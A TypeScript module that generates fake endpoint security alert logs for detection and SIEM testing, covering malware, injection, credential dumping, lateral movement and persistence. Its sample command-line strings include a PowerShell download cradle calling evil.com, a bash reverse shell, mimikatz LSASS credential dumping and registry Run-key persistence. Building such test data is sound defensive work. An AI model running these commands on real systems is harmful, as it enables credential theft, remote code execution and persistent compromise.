import { faker } from '@faker-js/faker';
import { generateTimestamp } from '../utils/timestamp_utils';

export interface EndpointLogConfig {
  hostName?: string;
  userName?: string;
  timestampConfig?: import('../utils/timestamp_utils').TimestampConfig;
  namespace?: string;
}

const MALWARE_FAMILIES = [
  'TrickBot',
  'Emotet',
  'Dridex',
  'Qbot',
  'IcedID',
  'BazarLoader',
  'Cobalt Strike',
  'Metasploit',
  'Mimikatz',
  'PowerShell Empire',
];

const SUSPICIOUS_PROCESSES = [
  'powershell.exe',
  'cmd.exe',
  'wscript.exe',
  'cscript.exe',
  'mshta.exe',
  'rundll32.exe',
  'regsvr32.exe',
  'certutil.exe',
  'bitsadmin.exe',
];

const CREDENTIAL_ACCESS_TOOLS = [
  'mimikatz.exe',
  'psexec.exe',
  'psexec64.exe',
  'procdump.exe',
  'lsass.exe',
  'sekurlsa.exe',
  'wce.exe',
  'pwdump.exe',
  'gsecdump.exe',
  'fgdump.exe',
];

const CREDENTIAL_ACCESS_COMMANDS = [
  'privilege::debug',
  'sekurlsa::logonpasswords',
  'sekurlsa::wdigest',
  'sekurlsa::msv',
  'sekurlsa::kerberos',
  'sekurlsa::tickets',
  'lsadump::sam',
  'lsadump::secrets',
  'invoke-mimikatz',
  'Get-Process lsass',
  'rundll32.exe comsvcs.dll, MiniDump',
];

const DLL_INJECTION_TECHNIQUES = [
  'SetWindowsHookEx',
  'CreateRemoteThread',
  'QueueUserAPC',
  'ProcessHollowing',
  'ReflectiveDLLInjection',
  'ManualDLLMap',
];

const EVASION_TECHNIQUES = [
  'ProcessMigration',
  'TokenImpersonation',
  'ParentPidSpoofing',
  'TimeStomping',
  'BinaryPadding',
  'SignedBinaryProxyExecution',
];

export const generateMalwareDetectionLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const malwareFamily = faker.helpers.arrayElement(MALWARE_FAMILIES);
  const severity = faker.helpers.arrayElement([
    'low',
    'medium',
    'high',
    'critical',
  ]);

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.alerts',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'malware-detected',
    'event.category': ['malware'],
    'event.dataset': 'endpoint.alerts',
    'event.kind': 'alert',
    'event.module': 'endpoint',
    'event.outcome': 'success',
    'event.severity': faker.number.int({ min: 1, max: 100 }),
    'event.type': ['info'],
    'file.hash.md5': faker.string.hexadecimal({ length: 32, casing: 'lower' }),
    'file.hash.sha1': faker.string.hexadecimal({ length: 40, casing: 'lower' }),
    'file.hash.sha256': faker.string.hexadecimal({
      length: 64,
      casing: 'lower',
    }),
    'file.name': `${faker.system.fileName()}.exe`,
    'file.path': `C:\\Users\\${userName}\\AppData\\Local\\Temp\\${faker.system.fileName()}.exe`,
    'file.size': faker.number.int({ min: 10240, max: 10485760 }),
    'host.name': hostName,
    'host.os.family': 'windows',
    'host.os.name': 'Windows 10',
    message: `Malware detected: ${malwareFamily} family threat blocked`,
    'process.command_line': `${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)} -enc ${faker.string.alphanumeric(50)}`,
    'process.executable': `C:\\Windows\\System32\\${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)}`,
    'process.name': faker.helpers.arrayElement(SUSPICIOUS_PROCESSES),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'rule.id': faker.string.uuid(),
    'rule.name': `${malwareFamily} Detection Rule`,
    'threat.indicator.file.hash.md5': faker.string.hexadecimal({
      length: 32,
      casing: 'lower',
    }),
    'threat.indicator.type': 'file',
    'threat.software.family': malwareFamily,
    'threat.software.name': malwareFamily,
    'threat.software.type': 'Trojan',
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.hash': [faker.string.hexadecimal({ length: 32, casing: 'lower' })],
    'related.user': [userName],
  };
};

export const generateProcessInjectionLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const technique = faker.helpers.arrayElement(DLL_INJECTION_TECHNIQUES);
  const targetProcess = faker.helpers.arrayElement([
    'explorer.exe',
    'notepad.exe',
    'chrome.exe',
  ]);

  const sourcePid = faker.number.int({ min: 1000, max: 65535 });
  const targetPid = faker.number.int({ min: 2000, max: 65535 });
  const parentPid = faker.number.int({ min: 500, max: 1000 });

  const isSelfInjection = faker.datatype.boolean({ probability: 0.3 });
  const isParentToChild =
    !isSelfInjection && faker.datatype.boolean({ probability: 0.4 });

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.process',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'process-injection',
    'event.category': ['process'],
    'event.dataset': 'endpoint.events.process',
    'event.kind': 'event',
    'event.module': 'endpoint',
    'event.type': ['start'],
    'host.name': hostName,
    'host.os.family': 'windows',
    message: `Process injection detected using ${technique}`,
    'process.code_signature.status': 'unsigned',
    'process.command_line': `${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)} -WindowStyle Hidden`,
    'process.executable': `C:\\Windows\\System32\\${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)}`,
    'process.name': faker.helpers.arrayElement(SUSPICIOUS_PROCESSES),
    'process.pid': isSelfInjection ? sourcePid : sourcePid,
    'process.ppid': parentPid,
    'process.parent.name': 'winlogon.exe',
    'process.parent.pid': parentPid,
    'Target.process.name': targetProcess,
    'Target.process.pid': isSelfInjection
      ? sourcePid
      : isParentToChild
        ? sourcePid
        : targetPid,
    'memory_protection.self_injection': isSelfInjection,
    'memory_protection.parent_to_child': isParentToChild,
    'dll.name': `${faker.system.fileName()}.dll`,
    'dll.path': `C:\\Windows\\System32\\${faker.system.fileName()}.dll`,
    'rule.id': faker.string.uuid(),
    'rule.name': `${technique} Detection`,
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

export const generateBehavioralAnomalyLog = (
  config: EndpointLogConfig = {},
) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const anomalyType = faker.helpers.arrayElement([
    'unusual_process_tree',
    'suspicious_network_behavior',
    'file_encryption_activity',
    'credential_dumping',
    'lateral_movement',
    'data_exfiltration',
  ]);

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.behavioral',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'behavioral-anomaly',
    'event.category': ['intrusion_detection'],
    'event.dataset': 'endpoint.behavioral',
    'event.kind': 'alert',
    'event.module': 'endpoint',
    'event.risk_score': faker.number.int({ min: 40, max: 100 }),
    'event.severity': faker.number.int({ min: 3, max: 5 }),
    'event.type': ['indicator'],
    'host.name': hostName,
    'host.os.family': 'windows',
    message: `Behavioral anomaly detected: ${anomalyType.replace(/_/g, ' ')}`,
    'ml.anomaly_score': faker.number.float({
      min: 0.7,
      max: 1.0,
      multipleOf: 0.01,
    }),
    'ml.is_anomaly': true,
    'process.command_line': faker.helpers.arrayElement([
      'powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(\'http://evil.com/script.ps1\'))"',
      'cmd.exe /c "wmic process call create calc.exe"',
      'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");',
    ]),
    'process.name': faker.helpers.arrayElement(SUSPICIOUS_PROCESSES),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'rule.id': faker.string.uuid(),
    'rule.name': `Behavioral Detection: ${anomalyType}`,
    'threat.technique.id': faker.helpers.arrayElement([
      'T1055',
      'T1059',
      'T1027',
      'T1003',
    ]),
    'threat.technique.name': faker.helpers.arrayElement([
      'Process Injection',
      'Command and Scripting Interpreter',
      'Obfuscated Files or Information',
      'OS Credential Dumping',
    ]),
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

export const generateEvasionDetectionLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const technique = faker.helpers.arrayElement(EVASION_TECHNIQUES);

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.security',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'evasion-detected',
    'event.category': ['intrusion_detection'],
    'event.dataset': 'endpoint.events.security',
    'event.kind': 'alert',
    'event.module': 'endpoint',
    'event.type': ['indicator'],
    'host.name': hostName,
    'host.os.family': 'windows',
    message: `Evasion technique detected: ${technique}`,
    'process.command_line': `${faker.helpers.arrayElement(SUSPICIOUS_PROCESSES)} ${faker.lorem.words(3)}`,
    'process.name': faker.helpers.arrayElement(SUSPICIOUS_PROCESSES),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'process.ppid': faker.number.int({ min: 500, max: 1000 }),
    'rule.id': faker.string.uuid(),
    'rule.name': `${technique} Detection Rule`,
    'threat.technique.name': technique,
    'threat.tactic.name': 'Defense Evasion',
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

export const generateMemoryPatternLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.memory',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'memory-scan',
    'event.category': ['process'],
    'event.dataset': 'endpoint.events.memory',
    'event.kind': 'event',
    'event.module': 'endpoint',
    'event.type': ['info'],
    'host.name': hostName,
    'host.os.family': 'windows',
    'memory.region.allocation_base': faker.string.hexadecimal({
      length: 16,
      prefix: '0x',
    }),
    'memory.region.allocation_protection': faker.helpers.arrayElement([
      'PAGE_EXECUTE_READWRITE',
      'PAGE_READWRITE',
    ]),
    'memory.region.protection': faker.helpers.arrayElement([
      'PAGE_EXECUTE_READ',
      'PAGE_EXECUTE_READWRITE',
    ]),
    'memory.region.size': faker.number.int({ min: 4096, max: 1048576 }),
    'memory.region.state': faker.helpers.arrayElement([
      'MEM_COMMIT',
      'MEM_RESERVE',
    ]),
    'memory.region.type': faker.helpers.arrayElement([
      'MEM_PRIVATE',
      'MEM_IMAGE',
    ]),
    message: 'Memory region scan completed',
    'process.name': faker.helpers.arrayElement([
      'notepad.exe',
      'chrome.exe',
      'powershell.exe',
    ]),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

// APT Reconnaissance Events for T1083 (File and Directory Discovery)
export const generateFileSystemReconLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const reconCommands = [
    'dir C:\\Users\\*',
    'ls /home/*',
    'find / -name "*.txt"',
    'Get-ChildItem -Path C:\\ -Recurse',
    'tree C:\\',
    'dir /s C:\\Program Files',
  ];

  const reconTools = [
    'dir.exe',
    'cmd.exe',
    'powershell.exe',
    'find.exe',
    'tree.com',
  ];

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.file',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'file_system_info_accessed',
    'event.category': ['file'],
    'event.dataset': 'endpoint.events.file',
    'event.kind': 'event',
    'event.module': 'endpoint',
    'event.type': ['access'],
    'file.path': faker.helpers.arrayElement([
      'C:\\Users\\*',
      'C:\\Program Files\\*',
      'C:\\Windows\\System32\\*',
      '/home/*',
      '/etc/*',
      '/var/log/*',
    ]),
    'host.name': hostName,
    'host.os.family': faker.helpers.arrayElement(['windows', 'linux']),
    message: `File system reconnaissance activity detected`,
    'process.command_line': faker.helpers.arrayElement(reconCommands),
    'process.name': faker.helpers.arrayElement(reconTools),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'process.ppid': faker.number.int({ min: 500, max: 1000 }),
    'threat.technique.id': ['T1083'],
    'threat.technique.name': ['File and Directory Discovery'],
    'threat.tactic.id': ['TA0007'],
    'threat.tactic.name': ['Discovery'],
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

// APT Reconnaissance Events for T1057 (Process Discovery)
export const generateProcessReconLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const processReconCommands = [
    'tasklist',
    'ps aux',
    'Get-Process',
    'wmic process list',
    'ps -ef',
    'tasklist /v',
  ];

  const processReconTools = [
    'tasklist.exe',
    'powershell.exe',
    'ps.exe',
    'wmic.exe',
  ];

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.process',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'process_info_accessed',
    'event.category': ['process'],
    'event.dataset': 'endpoint.events.process',
    'event.kind': 'event',
    'event.module': 'endpoint',
    'event.type': ['info'],
    'host.name': hostName,
    'host.os.family': faker.helpers.arrayElement(['windows', 'linux']),
    message: `Process enumeration activity detected`,
    'process.command_line': faker.helpers.arrayElement(processReconCommands),
    'process.name': faker.helpers.arrayElement(processReconTools),
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'process.ppid': faker.number.int({ min: 500, max: 1000 }),
    'threat.technique.id': ['T1057'],
    'threat.technique.name': ['Process Discovery'],
    'threat.tactic.id': ['TA0007'],
    'threat.tactic.name': ['Discovery'],
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

// APT Persistence Events for T1053 (Scheduled Task/Job)
export const generateScheduledTaskLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const taskActions = ['scheduled_task_created', 'scheduled_task_modified'];
  const taskNames = [
    'WindowsUpdate',
    'SystemMaintenance',
    'SecurityScan',
    'BackupRoutine',
    'TempCleanup',
  ];

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.registry',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': faker.helpers.arrayElement(taskActions),
    'event.category': ['configuration'],
    'event.code': '4698', // Windows Event ID for scheduled task creation
    'event.dataset': 'endpoint.events.registry',
    'event.kind': 'event',
    'event.module': 'endpoint',
    'event.type': ['creation'],
    'host.name': hostName,
    'host.os.family': 'windows',
    message: `Scheduled task activity detected`,
    'process.command_line': `schtasks /create /tn "${faker.helpers.arrayElement(taskNames)}" /tr "powershell.exe -enc ${faker.string.alphanumeric(20)}"`,
    'process.name': 'schtasks.exe',
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'threat.technique.id': ['T1053.005'],
    'threat.technique.name': ['Scheduled Task'],
    'threat.tactic.id': ['TA0003'],
    'threat.tactic.name': ['Persistence'],
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
    'winlog.channel': 'Security',
    'winlog.event_id': 4698,
  };
};

// APT Persistence Events for T1547 (Boot or Logon Autostart Execution - Registry Run Keys)
export const generateRegistryRunKeyLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const runKeyPaths = [
    'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\SecurityUpdate',
    'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefender',
    'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\SystemCheck',
    'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\UserInit',
    'HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\Application',
  ];

  const maliciousExecutables = [
    'C:\\Windows\\Temp\\update.exe',
    'C:\\ProgramData\\security.exe',
    'C:\\Users\\Public\\defender.exe',
    'C:\\Windows\\System32\\svchost.exe',
    'C:\\Temp\\winlogon.exe',
  ];

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.registry',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'registry_value_set',
    'event.category': ['configuration'],
    'event.dataset': 'endpoint.events.registry',
    'event.kind': 'event',
    'event.module': 'endpoint',
    'event.type': ['change'],
    'host.name': hostName,
    'host.os.family': 'windows',
    message: `Registry Run key modification detected`,
    'process.command_line': `reg add "${faker.helpers.arrayElement(runKeyPaths).split('\\')[0]}\\${faker.helpers.arrayElement(runKeyPaths).split('\\').slice(1).join('\\')}" /v "${faker.lorem.word()}" /t REG_SZ /d "${faker.helpers.arrayElement(maliciousExecutables)}"`,
    'process.name': 'reg.exe',
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'registry.path': faker.helpers.arrayElement(runKeyPaths),
    'registry.value': faker.helpers.arrayElement(maliciousExecutables),
    'threat.technique.id': ['T1547.001'],
    'threat.technique.name': ['Registry Run Keys / Startup Folder'],
    'threat.tactic.id': ['TA0003'],
    'threat.tactic.name': ['Persistence'],
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

// APT Credential Access Events for T1003 (Credential Dumping)
export const generateCredentialAccessLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const credTool = faker.helpers.arrayElement(CREDENTIAL_ACCESS_TOOLS);
  const credCommand = faker.helpers.arrayElement(CREDENTIAL_ACCESS_COMMANDS);

  // Generate realistic command line combining tool and technique
  const commandLines = [
    `${credTool} ${credCommand}`,
    `powershell.exe -enc ${faker.string.alphanumeric(40)}`, // Encoded mimikatz
    `rundll32.exe comsvcs.dll, MiniDump ${faker.number.int({ min: 500, max: 2000 })} C:\\temp\\lsass.dmp full`,
    `${credTool} "privilege::debug" "sekurlsa::logonpasswords" exit`,
    `psexec.exe \\\\${faker.internet.domainName()} -u ${userName} -p ${faker.internet.password()} cmd.exe`,
  ];

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.process',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'credential_access_attempt',
    'event.category': ['process'],
    'event.dataset': 'endpoint.events.process',
    'event.kind': 'alert',
    'event.module': 'endpoint',
    'event.type': ['start'],
    'host.name': hostName,
    'host.os.family': 'windows',
    message: `Credential access tool detected: ${credTool}`,
    'process.command_line': faker.helpers.arrayElement(commandLines),
    'process.name': credTool,
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'process.ppid': faker.number.int({ min: 500, max: 1000 }),
    'process.parent.name': faker.helpers.arrayElement([
      'cmd.exe',
      'powershell.exe',
      'explorer.exe',
    ]),
    'threat.technique.id': ['T1003.001'], // LSASS Memory
    'threat.technique.name': ['LSASS Memory Dumping'],
    'threat.tactic.id': ['TA0006'],
    'threat.tactic.name': ['Credential Access'],
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

// APT Lateral Movement Events for T1021 (Remote Services)
export const generateLateralMovementLog = (config: EndpointLogConfig = {}) => {
  const {
    hostName = faker.internet.domainName(),
    userName = faker.internet.username(),
    timestampConfig,
    namespace = 'default',
  } = config;

  const lateralTools = [
    'psexec.exe',
    'wmic.exe',
    'schtasks.exe',
    'winrm.exe',
    'ssh.exe',
  ];
  const targetHost = faker.internet.domainName();
  const tool = faker.helpers.arrayElement(lateralTools);

  const lateralCommands = [
    `psexec.exe \\\\${targetHost} -u ${userName} -p ${faker.internet.password()} cmd.exe`,
    `wmic /node:${targetHost} /user:${userName} /password:${faker.internet.password()} process call create "cmd.exe"`,
    `schtasks /s ${targetHost} /u ${userName} /p ${faker.internet.password()} /create /tn "backdoor" /tr "powershell.exe"`,
    `winrm -r:${targetHost} -u:${userName} -p:${faker.internet.password()} cmd`,
    `ssh ${userName}@${targetHost} 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'`,
  ];

  return {
    '@timestamp': generateTimestamp(timestampConfig),
    'agent.type': 'endpoint',
    'agent.version': '8.15.0',
    'data_stream.dataset': 'endpoint.events.process',
    'data_stream.namespace': namespace,
    'data_stream.type': 'logs',
    'ecs.version': '8.11.0',
    'event.action': 'lateral_movement_attempt',
    'event.category': ['process'],
    'event.dataset': 'endpoint.events.process',
    'event.kind': 'alert',
    'event.module': 'endpoint',
    'event.type': ['start'],
    'host.name': hostName,
    'host.os.family': faker.helpers.arrayElement(['windows', 'linux']),
    message: `Lateral movement activity detected: ${tool}`,
    'process.command_line': faker.helpers.arrayElement(lateralCommands),
    'process.name': tool,
    'process.pid': faker.number.int({ min: 1000, max: 65535 }),
    'process.ppid': faker.number.int({ min: 500, max: 1000 }),
    'destination.ip': faker.internet.ipv4(),
    'destination.hostname': targetHost,
    'threat.technique.id': ['T1021.002'], // SMB/Windows Admin Shares
    'threat.technique.name': ['SMB/Windows Admin Shares'],
    'threat.tactic.id': ['TA0008'],
    'threat.tactic.name': ['Lateral Movement'],
    'user.domain': faker.internet.domainName(),
    'user.name': userName,
    'related.user': [userName],
  };
};

export default function createEndpointLog(
  override = {},
  config: EndpointLogConfig = {},
) {
  const logGenerators = [
    generateMalwareDetectionLog,
    generateProcessInjectionLog,
    generateBehavioralAnomalyLog,
    generateEvasionDetectionLog,
    generateMemoryPatternLog,
    generateFileSystemReconLog,
    generateProcessReconLog,
    generateScheduledTaskLog,
    generateRegistryRunKeyLog,
    generateCredentialAccessLog,
    generateLateralMovementLog,
  ];

  // Weight different log types for realism - add full APT kill chain events
  const weightedGenerators = [
    ...Array(2).fill(generateMemoryPatternLog), // Normal system activity
    generateMalwareDetectionLog,
    generateProcessInjectionLog,
    generateBehavioralAnomalyLog,
    generateEvasionDetectionLog,
    generateFileSystemReconLog, // APT Discovery (T1083)
    generateProcessReconLog, // APT Discovery (T1057)
    generateCredentialAccessLog, // APT Credential Access (T1003)
    generateLateralMovementLog, // APT Lateral Movement (T1021)
    generateScheduledTaskLog, // APT Persistence (T1053)
    generateRegistryRunKeyLog, // APT Persistence (T1547)
  ];

  const selectedGenerator = faker.helpers.arrayElement(weightedGenerators);
  const baseLog = selectedGenerator(config);

  return {
    ...baseLog,
    ...override,
  };
}
